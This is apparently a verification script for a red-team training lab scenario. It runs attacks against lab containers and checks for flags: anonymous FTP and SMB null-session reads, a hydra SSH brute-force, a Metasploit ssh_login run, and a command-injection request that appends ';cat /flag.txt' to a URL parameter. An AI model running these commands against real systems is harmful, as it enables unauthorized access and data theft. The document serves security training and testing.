#!/usr/bin/env bash
# Note: deliberately not using `pipefail` here. `grep -q` exits as soon as it
# finds a match, which can close the pipe while the producer (hydra runs
# multiple parallel threads inside `docker exec`) is still writing later
# lines; under pipefail that SIGPIPE becomes the pipeline's exit status even
# though grep matched. The grep exit code alone is what these checks care
# about. (Same gotcha documented in scenarios/01-recon/verify.sh.)
set -eu
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }

# FTP anonymous read
A "curl -s ftp://172.28.0.30/pub/flag.txt --user anonymous:anon" | grep -q "FTP-FLAG" || fail "ftp flag"
# SMB null session read
A "smbclient //172.28.0.31/public -N -c 'get flag.txt /tmp/smbflag.txt'; cat /tmp/smbflag.txt" | grep -q "SMB-FLAG" || fail "smb flag"
# SSH weak password via hydra (svc:password123 is line in this tiny list)
A "printf 'password123\\nletmein\\nadmin\\n' > /tmp/pw.lst; \
   hydra -l svc -P /tmp/pw.lst -f ssh://172.28.0.32 2>/dev/null" | grep -q "password123" || fail "hydra ssh"
# Metasploit ssh_login yields a session
A "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; set USERNAME svc; set PASSWORD password123; set STOP_ON_SUCCESS true; run; exit'" \
  | grep -qi "Success" || fail "msf ssh_login"
# Web command injection
A "curl -s 'http://172.28.0.33/cmd.php?host=127.0.0.1;cat%20/flag.txt'" | grep -q "WEB-FLAG" || fail "cmd injection"

echo "PASS: 03-services"
